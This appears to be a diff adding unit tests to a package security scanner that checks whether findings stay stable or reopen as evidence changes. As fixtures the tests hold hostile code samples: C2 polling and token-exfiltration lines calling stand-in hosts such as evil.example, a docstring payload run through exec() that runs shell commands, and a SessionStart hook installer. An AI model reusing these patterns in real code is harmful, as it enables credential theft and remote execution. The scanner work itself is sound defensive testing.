@@ -513,6 +513,113 @@ def test_canon_evidence_does_not_strip_inner_marker_from_raw_code():
     assert sp._finding_key(base) != sp._finding_key(changed)
 
 
+def test_capped_multiline_digest_is_line_shift_stable():
+    # A span over the cap is digested from markerless code, so a pure line shift
+    # of the same span stays stable while a code change still reopens.
+    src = (
+        "while True:\n"
+        + "    x = 1\n" * 20
+        + "    time.sleep(60)\n    requests.get('http://old.example/poll')\n"
+    )
+    e1 = sp._extract_evidence(src, sp.RE_C2_POLLING)
+    e2 = sp._extract_evidence("\n\n" + src, sp.RE_C2_POLLING)
+    assert "sha256:" in e1  # span exceeded the cap
+    assert sp._evidence_hash(e1) == sp._evidence_hash(e2)
+    changed = src.replace("http://old.example/poll", "http://evil.example/c2")
+    assert sp._evidence_hash(e1) != sp._evidence_hash(
+        sp._extract_evidence(changed, sp.RE_C2_POLLING)
+    )
+
+
+def test_canon_evidence_strips_punctuation_label_marker():
+    # A label with punctuation (network+exec:) must still be stripped, so the
+    # line number alone does not change the key.
+    a = "network+exec: L12: subprocess.run(['id'])"
+    b = "network+exec: L99: subprocess.run(['id'])"
+    assert sp._evidence_hash(a) == sp._evidence_hash(b)
+
+
+def test_pth_unusually_large_finding_is_content_bound():
+    # Two different payloads of equal size and import count must get different
+    # keys: the finding now pins the .pth content via a digest.
+    a = [
+        f
+        for f in sp.check_pth_file("import abc; n=" + repr("!" * 500), "p/x.pth", "p")
+        if f.check.startswith("Unusually large executable .pth")
+    ]
+    b = [
+        f
+        for f in sp.check_pth_file("import xyz; n=" + repr("?" * 500), "p/x.pth", "p")
+        if f.check.startswith("Unusually large executable .pth")
+    ]
+    assert a and b
+    assert "sha256:" in a[0].evidence
+    assert sp._finding_key(a[0]) != sp._finding_key(b[0])
+
+
+def test_js_token_network_finding_binds_network_evidence():
+    # The JS stealer combo records both the token AND the network call, so a
+    # changed exfil endpoint reopens (RE_NETWORK-recognized call used here).
+    old = "const t='ghp_AAAAAAAAAAAAAAAAAAAAAAAA';\nrequests.get('http://old.example');\n"
+    new = "const t='ghp_AAAAAAAAAAAAAAAAAAAAAAAA';\nrequests.get('http://evil.example');\n"
+    fo = [f for f in sp.check_js_file(old, "p/p.js", "p") if "stealer" in f.check]
+    fn = [f for f in sp.check_js_file(new, "p/p.js", "p") if "stealer" in f.check]
+    assert fo and fn
+    assert "Network:" in fo[0].evidence
+    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
+
+
+def test_shell_combos_bind_network_evidence():
+    # Both shell combos record their network/exec side, so a changed endpoint
+    # reopens instead of riding the unchanged token or hook line.
+    old = "token='ghp_AAAAAAAAAAAAAAAAAAAAAAAA'\nrequests.get('http://old.example')\n"
+    new = "token='ghp_AAAAAAAAAAAAAAAAAAAAAAAA'\nrequests.get('http://evil.example')\n"
+    to = [
+        f
+        for f in sp.check_shell_file(old, "p/i.sh", "p")
+        if f.check == "Shell embeds credential regexes AND makes network calls"
+    ]
+    tn = [
+        f
+        for f in sp.check_shell_file(new, "p/i.sh", "p")
+        if f.check == "Shell embeds credential regexes AND makes network calls"
+    ]
+    assert to and tn
+    assert sp._finding_key(to[0]) != sp._finding_key(tn[0])
+    ho = "SessionStart hook installed\nrequests.get('http://old.example')\n"
+    hn = "SessionStart hook installed\nrequests.get('http://evil.example')\n"
+    go = [
+        f
+        for f in sp.check_shell_file(ho, "p/i.sh", "p")
+        if f.check.startswith("Shell installs developer-tool")
+    ]
+    gn = [
+        f
+        for f in sp.check_shell_file(hn, "p/i.sh", "p")
+        if f.check.startswith("Shell installs developer-tool")
+    ]
+    assert go and gn
+    assert "Hook:" in go[0].evidence
+    assert sp._finding_key(go[0]) != sp._finding_key(gn[0])
+
+
+def test_hidden_network_exec_reopens_on_endpoint_change():
+    # The hidden network+exec payload binds both the network and the exec signal,
+    # so changing the docstring exfil URL reopens the finding.
+    old = (
+        '"""\nimport urllib.request, os\nurllib.request.urlopen("http://old/x").read()\n'
+        'os.system("sh -c id")\n"""\nexec(__doc__)\n'
+    )
+    new = (
+        '"""\nimport urllib.request, os\nurllib.request.urlopen("http://evil/x").read()\n'
+        'os.system("sh -c id")\n"""\nexec(__doc__)\n'
+    )
+    fo = [f for f in sp.check_py_file(old, "p/d.py", "p") if "hidden network+exec" in f.check]
+    fn = [f for f in sp.check_py_file(new, "p/d.py", "p") if "hidden network+exec" in f.check]
+    assert fo and fn
+    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
+
+
 def test_large_js_bundle_finding_is_content_bound():
     # A large benign JS bundle yields a HIGH carrying a content digest, not empty
     # evidence: two different bundles in the same size bucket get different keys,
